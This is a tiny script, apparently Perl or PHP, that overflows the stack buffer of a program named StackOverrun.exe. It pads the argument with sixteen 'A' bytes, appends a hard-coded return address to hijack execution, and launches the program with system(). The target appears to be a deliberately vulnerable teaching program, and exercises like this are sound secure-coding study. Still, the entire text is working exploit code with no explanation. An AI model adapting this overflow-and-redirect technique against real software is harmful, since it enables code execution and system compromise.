$arg = "AAAAAAAAAAAAAAAA"."\x90\x11\x40\x00";
$cmd = "StackOverrun.exe ".$arg;

system($cmd);

